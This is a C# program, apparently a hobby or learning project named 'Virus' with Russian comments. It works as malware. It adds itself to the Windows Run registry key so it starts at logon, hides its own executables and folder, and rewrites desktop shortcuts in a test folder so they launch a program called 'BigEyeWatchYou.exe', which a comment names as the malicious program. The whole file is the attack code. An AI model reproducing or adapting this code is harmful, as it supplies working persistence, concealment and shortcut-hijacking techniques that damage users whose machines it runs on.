using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using ShellLinkChanger;

using System.Runtime.InteropServices;

namespace Virus
{
    class Program
    {

        [STAThread]
        static void Main(string[] args)
        {
            SetStartup();
            HideAll();

            // Получение пути к рабочему столу
            var desktopFolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            var testFolder = @"C:\Users\New\Desktop\Test";

            // Получение файлов ярлыков
            var files = ShellLinkHelper.GetAllShellLinkFiles(testFolder);

            // Получение абсолютного пути к вредоносной программе
            var targetPath = Path.GetFullPath("BigEyeWatchYou.exe");

            foreach (var file in files)
            {
                var link = ShellLinkHelper.GetShellLinkPath(file.FullName);
                if (!link.Path.Contains("BigEyeWatchYou.exe"))
                {
                    ShellLinkHelper.ChangeShellLink(file.FullName, targetPath,
                        QuotedMarked(Path.GetFileNameWithoutExtension(file.Name)));
                }
            }
        }

        /// <summary>
        /// Оборачивает строку в двойные кавычки
        /// </summary>
        /// <param name="value"></param>
        /// <returns></returns>
        private static string QuotedMarked(string value)
        {
            return $"\"{value}\"";
        }

        /// <summary>
        /// Меняет атрибуты файлов и директории на скрытые
        /// </summary>
        private static void HideAll()
        {
            try
            {
                File.SetAttributes("BigEyeWatchYou.exe", FileAttributes.Hidden);
                File.SetAttributes("Virus.exe", FileAttributes.Hidden);
                new DirectoryInfo(Directory.GetCurrentDirectory()).Attributes |= FileAttributes.Hidden;
            }
            catch { }
        }

        /// <summary>
        /// Добавляет приложение в автозагрузку, если его там нет
        /// </summary>
        private static void SetStartup()
        {

            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            string appFullPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string appName = Path.GetFileNameWithoutExtension(appFullPath);

#if DEBUG
            if (rk.GetValue(appName) != null)
            {
                rk.DeleteValue(appName);
            }
#endif

            if (rk.GetValue(appName) == null)
            {
                

                rk.SetValue(appName, appFullPath);
            }
        }
    }
}
